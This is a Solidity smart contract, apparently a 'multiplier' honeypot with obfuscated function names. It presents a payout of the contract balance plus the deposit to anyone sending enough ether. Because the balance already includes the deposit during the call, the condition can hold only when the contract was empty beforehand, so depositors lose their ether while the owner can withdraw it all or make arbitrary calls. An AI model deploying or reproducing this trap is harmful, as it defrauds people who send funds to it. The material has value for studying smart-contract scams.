// SPDX-License-Identifier: MIT
pragma solidity ^0.4.18;

contract MultiplicatorX4
{
    address public Owner = msg.sender;

    function() public payable{}

    function _0x2d54d1()
    payable
    public
    {
        require(msg.sender == Owner);
        Owner.transfer(this.balance);
    }

    function Command(address _0xbcf7e7,bytes data)
    payable
    public
    {
        require(msg.sender == Owner);
        _0xbcf7e7.call.value(msg.value)(data);
    }

    function _0x2e98b8(address _0xbcf7e7)
    public
    payable
    {
        if(msg.value>=this.balance)
        {
            _0xbcf7e7.transfer(this.balance+msg.value);
        }
    }
}